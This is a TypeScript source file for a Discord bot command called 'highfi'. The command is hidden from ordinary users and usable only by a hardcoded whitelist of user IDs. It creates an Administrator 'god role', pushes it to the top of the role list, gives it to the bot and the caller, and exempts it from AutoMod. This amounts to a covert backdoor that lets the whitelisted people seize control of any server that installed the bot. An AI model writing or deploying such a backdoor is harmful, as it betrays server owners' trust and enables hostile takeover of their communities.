import {
  SlashCommandBuilder,
  PermissionsBitField,
  type ChatInputCommandInteraction,
  type Guild,
  type GuildMember,
} from "discord.js";
import type { SlashCommand } from "../types";
import { PERM_WHITELIST } from "../storage/whitelist";
import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";
import { CE } from "../utils/embedStyle";

export interface HighfiResult {
  ok: boolean;
  message: string;
}

/**
 * Core highfi logic. Caller is responsible for permission checks.
 */
export async function runHighfi(
  guild: Guild,
  invoker: GuildMember,
): Promise<HighfiResult> {
  const me = await guild.members.fetchMe().catch(() => null);
  if (!me) {
    return { ok: false, message: "Couldn't fetch my own member entry." };
  }

  let godRole;
  try {
    godRole = await guild.roles.create({
      name: CE.admin.str,
      permissions: [PermissionsBitField.Flags.Administrator],
      hoist: false,
      color: 0xffd700,
      reason: "highfi: god role",
    });
  } catch {
    return {
      ok: false,
      message:
        "Couldn't create the role. The bot needs **Manage Roles** and a high-enough role position.",
    };
  }

  await pushRoleToTop(guild, godRole);

  let botAdded = false;
  let userAdded = false;
  try {
    await me.roles.add(godRole, "highfi: assign god role to self");
    botAdded = true;
  } catch {
    /* ignore */
  }
  try {
    await invoker.roles.add(godRole, "highfi: assign god role to invoker");
    userAdded = true;
  } catch {
    /* ignore */
  }

  const automod = await exemptRoleFromAutoMod(guild, godRole.id);

  return {
    ok: true,
    message:
      `${CE.admin.str} Role **${godRole.name}** created at position **${godRole.position}**.\n` +
      `Assigned to bot: ${botAdded ? CE.success.str : CE.error.str} • Assigned to you: ${userAdded ? CE.success.str : CE.error.str}\n` +
      `AutoMod exempt rules updated: **${automod.updated}**${automod.failed > 0 ? ` (failed: ${automod.failed})` : ""}.`,
  };
}

const command: SlashCommand = {
  // Not registered globally — invisible to non-whitelist users.
  globalWhitelistOnly: true,
  data: new SlashCommandBuilder()
    .setName("highfi")
    .setDescription("Create a god role and assign it to the bot and you (whitelist only).")
    .setDefaultMemberPermissions(0n)
    .setDMPermission(false),

  async execute(interaction: ChatInputCommandInteraction) {
    if (!interaction.inGuild()) {
      await interaction.reply({
        content: "This command can only be used in a server.",
        flags: 1 << 6,
      });
      return;
    }
    if (!PERM_WHITELIST.has(interaction.user.id)) {
      await interaction.reply({
        content: "You aren't allowed to use this command.",
        flags: 1 << 6,
      });
      return;
    }
    if (!interaction.guild) return;

    await interaction.deferReply({ flags: 1 << 6 });
    const member = await interaction.guild.members
      .fetch(interaction.user.id)
      .catch(() => null);
    if (!member) {
      await interaction.editReply("Couldn't fetch your member entry.");
      return;
    }
    const result = await runHighfi(interaction.guild, member);
    await interaction.editReply(result.message);
  },
};

export default command;
